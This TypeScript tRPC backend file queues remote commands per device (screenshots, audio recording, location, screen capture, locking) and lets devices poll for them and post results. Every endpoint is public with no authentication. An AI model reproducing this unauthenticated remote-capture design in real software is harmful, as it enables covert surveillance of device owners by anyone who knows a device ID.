import { publicProcedure } from '../../../create-context';
import { z } from 'zod';

interface RemoteCommand {
  id: string;
  deviceId: string;
  type: 'screenshot' | 'start_audio' | 'stop_audio' | 'get_location' | 'lock_device' | 'get_screen';
  timestamp: string;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  result?: string;
  error?: string;
}

const commands = new Map<string, RemoteCommand[]>();

export const sendCommandProcedure = publicProcedure
  .input(z.object({
    deviceId: z.string(),
    type: z.enum(['screenshot', 'start_audio', 'stop_audio', 'get_location', 'lock_device', 'get_screen']),
  }))
  .mutation(async ({ input }) => {
    console.log('[Backend] Sending command:', input.type, 'to device:', input.deviceId);
    
    const command: RemoteCommand = {
      id: `cmd_${Date.now()}_${Math.random().toString(36).substring(7)}`,
      deviceId: input.deviceId,
      type: input.type,
      timestamp: new Date().toISOString(),
      status: 'pending',
    };
    
    const deviceCommands = commands.get(input.deviceId) || [];
    deviceCommands.push(command);
    commands.set(input.deviceId, deviceCommands);
    
    return command;
  });

export const getCommandsProcedure = publicProcedure
  .input(z.object({
    deviceId: z.string(),
  }))
  .query(async ({ input }) => {
    const deviceCommands = commands.get(input.deviceId) || [];
    return deviceCommands.filter(cmd => cmd.status === 'pending' || cmd.status === 'executing');
  });

export const updateCommandStatusProcedure = publicProcedure
  .input(z.object({
    deviceId: z.string(),
    commandId: z.string(),
    status: z.enum(['pending', 'executing', 'completed', 'failed']),
    result: z.string().optional(),
    error: z.string().optional(),
  }))
  .mutation(async ({ input }) => {
    console.log('[Backend] Updating command status:', input.commandId, 'to', input.status);
    
    const deviceCommands = commands.get(input.deviceId) || [];
    const commandIndex = deviceCommands.findIndex(cmd => cmd.id === input.commandId);
    
    if (commandIndex >= 0) {
      deviceCommands[commandIndex].status = input.status;
      if (input.result) deviceCommands[commandIndex].result = input.result;
      if (input.error) deviceCommands[commandIndex].error = input.error;
      commands.set(input.deviceId, deviceCommands);
    }
    
    return { success: true };
  });

export const getCommandResultProcedure = publicProcedure
  .input(z.object({
    deviceId: z.string(),
    commandId: z.string(),
  }))
  .query(async ({ input }) => {
    const deviceCommands = commands.get(input.deviceId) || [];
    const command = deviceCommands.find(cmd => cmd.id === input.commandId);
    return command || null;
  });
